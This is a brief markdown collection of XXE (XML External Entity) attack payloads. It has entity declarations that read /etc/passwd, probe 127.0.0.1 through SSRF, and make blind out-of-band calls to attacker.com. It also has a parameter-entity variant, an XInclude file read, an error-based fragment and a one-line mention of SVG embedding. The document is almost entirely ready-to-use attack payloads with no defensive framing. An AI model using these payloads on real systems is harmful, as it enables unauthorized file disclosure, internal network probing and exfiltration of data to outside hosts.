# XXE Payload Collection

## Basic File Read

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

---

## SSRF

<!ENTITY xxe SYSTEM "http://127.0.0.1">

---

## Blind OAST

<!ENTITY xxe SYSTEM "http://attacker.com">

---

## Parameter Entity

<!ENTITY % xxe SYSTEM "http://attacker.com">

%xxe;

---

## XInclude

<xi:include parse="text"
href="file:///etc/passwd"/>

---

## Error Based

file:///nonexistent/%file;

---

## SVG XXE

Embed DOCTYPE inside SVG.